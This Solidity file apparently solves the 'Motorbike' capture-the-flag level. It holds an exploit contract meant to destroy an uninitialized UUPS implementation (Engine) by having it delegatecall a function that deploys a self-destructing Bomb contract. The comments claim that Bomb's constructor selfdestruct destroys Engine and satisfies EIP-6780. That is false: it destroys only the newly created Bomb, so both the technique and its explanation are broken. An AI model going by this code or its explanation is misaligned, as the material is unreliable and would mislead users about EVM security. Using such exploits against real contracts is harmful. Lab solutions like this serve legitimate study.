// SPDX-License-Identifier: MIT
pragma solidity <0.8.0;

/**
 * @title MotorbikeExploit
 * @dev Exploits uninitialized UUPS implementation to destroy Engine
 * 
 * This works with EIP-6780 by creating and selfdestructing a contract
 * in the SAME TRANSACTION via delegatecall.
 * 
 * How it works:
 * 1. Engine calls upgradeToAndCall(this, "explode()")
 * 2. Via delegatecall, explode() runs in Engine's context
 * 3. explode() deploys a Bomb contract
 * 4. Bomb's constructor immediately selfdestructs
 * 5. Creation + selfdestruct in same tx â†’ code is destroyed (EIP-6780 compliant)!
 */
contract MotorbikeExploit {
    /**
     * @dev This function will be called via delegatecall from Engine
     * It deploys a Bomb that selfdestructs in its constructor
     * Since deployment and selfdestruct happen in same tx, EIP-6780 allows destruction
     */
    function explode() external {
        // Deploy Bomb contract - it will selfdestruct immediately in constructor
        // When called via delegatecall, this destroys the ENGINE, not this contract
        new Bomb();
    }
}

/**
 * @title Bomb
 * @dev A contract that selfdestructs immediately upon creation
 * This satisfies EIP-6780 requirement: selfdestruct in same tx as creation
 */
contract Bomb {
    constructor() public {
        // Selfdestruct in constructor = same transaction as creation
        // This will destroy the calling context (Engine via delegatecall)
        selfdestruct(payable(address(0)));
    }
}